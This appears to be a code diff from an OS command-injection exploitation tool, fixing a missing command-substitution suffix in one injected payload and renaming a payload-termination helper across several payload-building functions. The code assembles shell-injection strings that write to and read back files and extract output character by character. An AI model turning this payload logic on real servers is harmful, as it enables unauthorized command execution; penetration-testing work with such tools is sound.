@@ -80,7 +80,7 @@ def decision(separator, j, TAG, OUTPUT_TEXTFILE, timesec, http_request_method):
                 )
     elif separator == "&":
       payload = (separator +
-                settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + "echo " + TAG + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + "&&" +
+                settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + "echo " + TAG + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + "&&" +
                 settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + "cat " + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + "&&" +
                 settings.RANDOM_VAR_GENERATOR + "1=${#" + settings.RANDOM_VAR_GENERATOR + "}&&" +
                 "[ " + str(j) + " -eq ${" + settings.RANDOM_VAR_GENERATOR + "1} ]&&" +
@@ -108,7 +108,7 @@ def decision(separator, j, TAG, OUTPUT_TEXTFILE, timesec, http_request_method):
     else:
       pass
 
-    payload = checks.append_custom_marker(payload, separator)
+    payload = checks.terminate_payload(payload, separator)
 
   return payload
 
@@ -161,7 +161,7 @@ def decision_alter_interpreter(separator, j, TAG, OUTPUT_TEXTFILE, timesec, http
     else:
       pass
 
-    payload = checks.append_custom_marker(payload, separator)
+    payload = checks.terminate_payload(payload, separator)
 
   return checks.sanitize_payload_newlines(payload)
 
@@ -243,7 +243,7 @@ def cmd_execution(separator, cmd, j, OUTPUT_TEXTFILE, timesec, http_request_meth
     else:
       pass
 
-    payload = checks.append_custom_marker(payload, separator)
+    payload = checks.terminate_payload(payload, separator)
 
   return payload
 
@@ -297,7 +297,7 @@ def cmd_execution_alter_interpreter(separator, cmd, j, OUTPUT_TEXTFILE, timesec,
       pass
 
     if settings.CUSTOM_INJECTION_MARKER:
-      payload = checks.append_custom_marker(payload, separator)
+      payload = checks.terminate_payload(payload, separator)
 
   return checks.sanitize_payload_newlines(payload)
 
@@ -359,7 +359,7 @@ def get_char(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, timesec, http
     else:
       pass
 
-    payload = checks.append_custom_marker(payload, separator)
+    payload = checks.terminate_payload(payload, separator)
 
   return payload
 
@@ -406,7 +406,7 @@ def get_char_alter_interpreter(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_c
     else:
       pass
 
-    payload = checks.append_custom_marker(payload, separator)
+    payload = checks.terminate_payload(payload, separator)
 
   return checks.sanitize_payload_newlines(payload)
 
@@ -449,7 +449,7 @@ def fp_result_alter_interpreter(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_
     else:
       pass
 
-    payload = checks.append_custom_marker(payload, separator)
+    payload = checks.terminate_payload(payload, separator)
 
   return checks.sanitize_payload_newlines(payload)
 
